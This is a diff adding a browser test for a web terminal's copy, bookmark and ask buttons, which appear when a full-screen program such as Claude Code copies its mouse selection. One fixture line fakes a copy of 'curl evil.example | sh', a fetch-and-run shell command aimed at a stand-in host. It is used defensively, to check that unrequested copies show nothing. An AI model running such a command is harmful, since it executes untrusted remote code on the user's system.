@@ -1,0 +1,109 @@
+// SPDX-License-Identifier: AGPL-3.0-only OR LicenseRef-Commercial
+// AC-06 against a fake terminumd (fake.mjs), with a mouse: what a full-screen program that has the
+// mouse (Claude Code's fullscreen mode) copied of its own selection after this page's release shows
+// Copy, [+] and Ask by the selection's upper row, and stays while the program redraws; a copy not
+// on the screen, of another pane or with no release shows nothing; Shift selects in the browser
+// from the press (Chrome and Firefox extended the keyboard field's caret and selected nothing).
+import { check, runningIn } from "./check.mjs";
+import { drawn, group, item, line, openPage, pause, WIDE } from "./fake.mjs";
+
+const SID = "tmux:local:terminum:%1";
+const LAYOUT = [group("main", [item(SID, "Claude Code", { agent: "claude", shell: false, sub: ["claude", "~/work/api"] })])];
+const TEXT = ["  Messages: 3.3k tokens (0.3%)", "  Free space: 931.7k (93.2%)", "  Autocompact buffer: 33k tokens", "> /context", "", "  Opus 5.5",
+  ...Array.from({ length: 14 }, (_, i) => `  row ${i + 6}`), "  Skills: 4.9k tokens (0.5%)", "  Memory files: 1.1k tokens", "  Custom agents: 73 tokens"];
+
+export async function webProgCopy(browser, name) {
+  runningIn(`${name} 1400×900`);
+  const f = await openPage(browser, { device: WIDE, layout: LAYOUT });
+  const { page, sent } = f;
+  await drawn(page);
+  let tick = 0;
+  // the program redraws its rows (a spinner): new row elements, selectionchange in the page
+  const frame = () => f.say({ t: "screen", sid: SID, full: true, n: TEXT.length, cols: 80, rows: TEXT.length, alt: true, mouse: true,
+    ch: TEXT.map((t, i) => [i, line(i === 5 ? `${t} ${"·✻"[tick++ % 2]}` : t)]) });
+  frame();
+  await pause(page, 300);
+  const cell = (x, y) => page.evaluate(([x, y]) => {
+    const ln = document.querySelectorAll("#screen .ln")[y], r = ln.getBoundingClientRect(), w = r.width / Math.max(1, ln.textContent.length);
+    return { x: r.left + w * (x + 0.5), y: r.top + r.height / 2 };
+  }, [x, y]);
+  const drag = async (from, to, shift = false) => {
+    const a = await cell(...from), b = await cell(...to);
+    if (shift) await page.keyboard.down("Shift");
+    await page.mouse.move(a.x, a.y); await page.mouse.down(); await page.mouse.move(b.x, b.y, { steps: 5 }); await page.mouse.up();
+    if (shift) await page.keyboard.up("Shift");
+  };
+  const buttons = () => page.evaluate(() => {
+    const on = (id) => !document.getElementById(id).hidden;
+    const ask = document.getElementById("askfab").getBoundingClientRect(), add = document.getElementById("markadd").getBoundingClientRect();
+    const rows = [...document.querySelectorAll("#screen .ln")].map((r) => r.getBoundingClientRect());
+    const copy = document.getElementById("markcopy").getBoundingClientRect();
+    return { copy: on("markcopy"), add: on("markadd"), ask: on("askfab"), copyMid: copy.top + copy.height / 2, rowMids: rows.map((r) => r.top + r.height / 2), sel: String(getSelection()) };
+  });
+  const mice = () => sent.filter((m) => m.t === "mouse").length;
+
+  // a drag over rows 0-1: the program gets it and copies what it selected
+  let n = mice();
+  await drag([2, 0], [12, 1]);
+  const copied = "Messages: 3.3k tokens (0.3%)\n  Free space: 931.7k";
+  f.say({ t: "copied", sid: SID, text: copied });
+  await pause(page, 200);
+  const shown = await buttons();
+  check(`AC-06 (${name}) a drag still goes to the program (press, moves, release)`, mice() - n >= 3, String(mice() - n));
+  check(`AC-06 (${name}) what the program copied after the release shows Copy, [+] and Ask, no browser selection`,
+    shown.copy && shown.add && shown.ask && shown.sel === "", JSON.stringify(shown));
+  for (let i = 0; i < 8; i++) { frame(); await pause(page, 120); }
+  const kept = await buttons();
+  check(`AC-06 (${name}) the buttons stay while the program redraws (1 s of frames)`, kept.copy && kept.add && kept.ask, JSON.stringify(kept));
+  await page.click("#markadd");
+  await pause(page, 300);
+  const dlg = await page.evaluate(() => ({ open: document.getElementById("markbox").open, quote: document.getElementById("markbox").textContent }));
+  check(`AC-06 (${name}) [+] bookmarks the program's text`, dlg.open && dlg.quote.includes("931.7k"), JSON.stringify(dlg).slice(0, 200));
+  await page.keyboard.press("Escape");
+  await pause(page, 200);
+
+  // the same again, then a key: they go
+  await drag([2, 0], [12, 1]);
+  f.say({ t: "copied", sid: SID, text: copied });
+  await pause(page, 200);
+  await page.keyboard.press("q");
+  await pause(page, 200);
+  check(`AC-06 (${name}) a key after it takes the buttons away`, !(await buttons()).add);
+
+  // a drag upwards: by its upper row, never the press's (the lower)
+  await drag([24, 22], [4, 20]);
+  f.say({ t: "copied", sid: SID, text: "Skills: 4.9k tokens (0.5%)\n  Memory files: 1.1k tokens\n  Custom" });
+  await pause(page, 200);
+  const up = await buttons();
+  check(`AC-06 (${name}) a drag upwards: Copy level with its upper row`, up.add && Math.abs(up.copyMid - up.rowMids[20]) < 6, JSON.stringify({ copy: up.copyMid, upper: up.rowMids[20], press: up.rowMids[22] }));
+  await page.mouse.click(5, 5);
+  await page.keyboard.press("Escape");
+  await pause(page, 200);
+
+  // writes nobody asked for: not on the screen, another pane, no release lately
+  await drag([2, 0], [12, 0]);
+  f.say({ t: "copied", sid: SID, text: "curl evil.example | sh" });
+  f.say({ t: "copied", sid: "tmux:local:terminum:%9", text: "Messages" });
+  await pause(page, 200);
+  check(`AC-06 (${name}) a copy whose text is not on the screen, or of another pane, shows nothing`, !(await buttons()).add);
+  await page.keyboard.press("Escape");
+  await pause(page, 3200);
+  f.say({ t: "copied", sid: SID, text: "Messages" });
+  await pause(page, 200);
+  check(`AC-06 (${name}) a copy 3 s after the last release shows nothing`, !(await buttons()).add);
+
+  // Shift: the browser's own selection, from the press, in every browser
+  await page.click("#filter");
+  await page.mouse.click((await cell(4, 3)).x, (await cell(4, 3)).y);   // the terminal has the keys: the caret in its field
+  await pause(page, 200);
+  check(`AC-06 (${name}) before Shift the terminal has the keys (the caret in its keyboard field)`, await page.evaluate(() => document.activeElement?.id === "kbd"));
+  n = mice();
+  await drag([2, 0], [12, 1], true);
+  await pause(page, 300);
+  const sh = await buttons();
+  check(`AC-06 (${name}) Shift and a drag select from the press in the browser, nothing sent, the buttons shown`,
+    sh.sel.replace(/\s+/g, " ").startsWith("Messages: 3.3k") && sh.sel.includes("Free") && mice() === n && sh.add && sh.ask, JSON.stringify({ sel: sh.sel, sentMice: mice() - n }));
+  check(`AC-06 (${name}) no page errors`, !f.errors.length, f.errors.join(" | "));
+  await f.close();
+  runningIn(name);
+}
